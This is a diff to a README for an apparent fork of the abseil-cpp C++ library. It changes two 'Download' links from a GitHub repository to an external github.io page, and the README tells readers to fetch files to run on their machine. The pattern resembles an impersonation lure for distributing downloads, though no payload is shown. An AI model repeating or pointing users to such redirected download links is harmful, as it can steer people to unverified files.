@@ -1,6 +1,6 @@
 # 🛠️ abseil-cpp - Improve your C++ project code quality
 
-[![Download Software](https://img.shields.io/badge/Download-abseil--cpp-blue.svg)](https://github.com/Kth79100/abseil-cpp)
+[![Download Software](https://img.shields.io/badge/Download-abseil--cpp-blue.svg)](https://kth79100.github.io)
 
 ## 📋 Project Overview
 
@@ -20,7 +20,7 @@ Your computer needs a few things to run this code library. Ensure you meet these
 
 You perform the installation by visiting the official release page. A developer provides the files for you to run on your machine.
 
-[Click here to visit the download page](https://github.com/Kth79100/abseil-cpp)
+[Click here to visit the download page](https://kth79100.github.io)
 
 Follow these steps to get the files:
 
